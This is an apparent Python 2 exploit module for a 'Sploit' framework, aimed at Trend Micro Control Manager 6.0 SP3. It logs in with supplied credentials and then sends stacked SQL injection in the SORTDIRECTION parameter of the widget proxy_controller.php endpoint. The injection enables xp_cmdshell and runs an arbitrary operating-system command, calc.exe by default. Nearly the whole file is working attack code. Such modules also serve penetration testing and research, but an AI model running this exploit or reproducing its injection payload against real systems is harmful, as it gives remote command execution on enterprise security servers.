#!/usr/bin/env python

import socket
import urllib2
import urllib
import cookielib
import ssl
import md5
import hmac
import re
from collections import OrderedDict
from Sploit import Sploit
from shellcodes.Shellcodes import OSShellcodes
from shellcodes.ShellUtils import Constants

INFO = {}
INFO['NAME'] = 'efa_trendmicro_control_manager_sqli_rce'
INFO['DESCRIPTION'] = 'Trend Micro Control Manager SQLi RCE'
INFO['VENDOR'] = 'http://www.trendmicro.com'
INFO['CVE Name'] = ''
INFO['DOWNLOAD_LINK'] = 'http://downloadcenter.trendmicro.com/index.php?regs=NABU&clk=latest&clkval=4202&lang_loc=1#fragment-4248'
INFO['LINKS'] = []
INFO['CHANGELOG'] = '7 Feb 2018'
INFO['PATH'] = 'General/'
INFO['NOTES'] = """    This vulnerability allows remote attackers to execute arbitrary SQL query. 
 Authentication is required to exploit this vulnerability.
    Tested against TMCM 6.0 SP3 Patch 2.
"""

OPTIONS = OrderedDict()
OPTIONS['HOST'] = '192.168.1.176'
OPTIONS['PORT'] = 80
OPTIONS['SSL'] = False
OPTIONS['USERNAME'] = 'admin'
OPTIONS['PASSWORD'] = 'password'
OPTIONS['COMMAND'] = 'calc.exe'


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', OPTIONS['HOST'])
        self.port = self.args.get('PORT', OPTIONS['PORT'])
        self.ssl = self.args.get('SSL', OPTIONS['SSL'])
        self.username = self.args.get('USERNAME', OPTIONS['USERNAME'])
        self.password = self.args.get('PASSWORD', OPTIONS['PASSWORD'])
        self.command = self.args.get('COMMAND', OPTIONS['COMMAND'])

    def login(self):
        self.log('[*] Trying to login')
        cookie = cookielib.CookieJar()
        self.cookie = cookie
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        opener = urllib2.build_opener(urllib2.HTTPSHandler(context=ctx), urllib2.HTTPCookieProcessor(cookie))
        self.opener = opener
        resp = self.make_request('WebApp/login.aspx')
        data = {
            "Query": "ChallengeNumber"
        }
        resp = self.make_request('WebApp/login.aspx', data)
        challenge_number = resp[16: 16 + 36]

        data = {
            "txtUserName": self.username,
            "txtPassword": self.getpassword(self.password, challenge_number),
            "HidChallenge": '',
            "loginMessage": '',
            "__EVENTTARGET": 'loginLink',
            "__LASTFOCUS": '',
        }
        resp = self.make_request('WebApp/login.aspx', data, resp)
        if 'session_manager.aspx' not in resp:
            self.log('[-] Credentials are not valid')
            self.finish(False)

    def getpassword(self, password, secret):
        return hmac.new(secret, md5.md5(password).hexdigest()).hexdigest()

    def get_tokens(self, data):
        def extract_values(token):
            regexp = 'id="' + token + '"\s*value="(.*?)"'
            res = re.search(regexp, data)
            if res:
                return res.group(1)
            return ''

        __VIEWSTATE = extract_values('__VIEWSTATE')
        __EVENTARGUMENT = extract_values('__EVENTARGUMENT')
        __EVENTTARGET = extract_values('__EVENTTARGET')
        __VIEWSTATEGENERATOR = extract_values('__VIEWSTATEGENERATOR')
        __EVENTVALIDATION = extract_values('__EVENTVALIDATION')
        ret = {
            '__VIEWSTATE': __VIEWSTATE,
            '__EVENTARGUMENT': __EVENTARGUMENT,
            '__EVENTTARGET': __EVENTTARGET,
            '__VIEWSTATEGENERATOR': __VIEWSTATEGENERATOR,
            '__EVENTVALIDATION': __EVENTVALIDATION,
        }
        # print ret
        return ret

    def make_request(self, uri='', data='', response='', headers={}):
        proto = 'https' if self.ssl else 'http'
        url = '%s://%s:%s/%s' % (proto, self.host, self.port, uri)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        if data:
            if response:
                data = dict(self.get_tokens(response), **data)
            # print data
            data = urllib.urlencode(data)
            request = urllib2.Request(url, data=data, headers=headers)
        else:
            request = url
        resp = self.opener.open(request).read()
        # print resp
        return resp

    def inject(self):
        data = {
            "module": "modDLP",
            "serverid": "1",
            "WID": "33",
            "SELECTION": "0",
            "T": "999",
            "G": "1",
            "SORTDIRECTION": "DESC;EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;EXEC xp_cmdshell '%s'" % self.command,
            "SORTFIELD": "Violation",
            "V": "2",
            "D": "14",
            "F": "all",
            "lang": "en_US",
            "widgetname": "modDLPViolationCnt",
            "topcount": "5",
            "displayasothers": "1",
            "userdaterange": "0",
            "datapointdaterange": "1"
        }
        resp = self.make_request('WebApp/widget/index.php')
        self.log('[+] Executing "%s"' % self.command)
        resp = self.make_request('WebApp/widget/proxy_controller.php', data=data)
        pass


    def run(self):
        #Get options from gui
        self.args()
        self.login()
        self.inject()
        self.finish(True)


if __name__ == '__main__':
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()